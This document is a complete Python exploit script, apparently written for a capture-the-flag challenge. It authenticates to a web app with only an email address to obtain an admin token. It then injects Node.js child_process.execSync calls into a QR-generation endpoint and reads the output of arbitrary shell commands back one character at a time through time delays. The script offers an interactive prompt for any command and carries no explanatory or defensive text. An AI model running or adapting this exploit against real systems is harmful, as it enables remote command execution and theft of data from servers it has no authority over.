import requests
import json
import string
import time
import sys
import argparse

CHARSET = string.printable.strip()  # ASCII 32â€“126

def get_admin_token(base_url, email):
    url = f"{base_url}/api/auth/authenticate"
    headers = {"Content-Type": "application/json"}
    data = {"email": email}
    r = requests.post(url, headers=headers, json=data)
    r.raise_for_status()
    return r.json()["token"]

def build_payload(user_cmd, pos, char, sleep_time):
    shell = (
        f"{user_cmd} | head -c {pos} | tail -c 1 | "
        f"{{ read c; [ \"$c\" = '{char}' ] && sleep {sleep_time}; }}"
    )
    js = (
        "'}) + require(\"child_process\").execSync(\"" +
        shell.replace("\\", "\\\\").replace("\"", "\\\"") +
        "\") //"
    )
    return {"text": js}

def is_char_match(qr_endpoint, token, payload, threshold):
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    start = time.time()
    r = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
    elapsed = time.time() - start
    return elapsed >= threshold

def extract_output(qr_endpoint, token, user_cmd, sleep_time, threshold):
    print(f"[+] Starting blind extraction using: {user_cmd}")
    result = ""
    pos = 1

    while True:
        for char in CHARSET:
            payload = build_payload(user_cmd, pos, char, sleep_time)
            if is_char_match(qr_endpoint, token, payload, threshold):
                result += char
                print(char, end="", flush=True)
                pos += 1
                if char == "}":
                    print("\n[*] Flag extraction complete.")
                    return result
                break
        else:
            print(f"\n[!] No match at position {pos}. Stopping.")
            break
    return result

def main():
    parser = argparse.ArgumentParser(description="Blind Command Injection Exploit")
    parser.add_argument("--target", required=True, help="Base target URL (e.g. http://127.0.0.1:5000)")
    parser.add_argument("--email", required=True, help="Authentication email")
    parser.add_argument("--sleep", type=int, default=2, help="Sleep time on true condition (default: 2)")
    parser.add_argument("--threshold", type=float, default=1.8, help="Response time threshold in seconds (default: 1.8)")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    qr_endpoint = f"{base_url}/api/service/generate"
    token = get_admin_token(base_url, args.email)

    try:
        while True:
            user_cmd = input("\n> ").strip()
            if user_cmd:
                extract_output(qr_endpoint, token, user_cmd, args.sleep, args.threshold)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()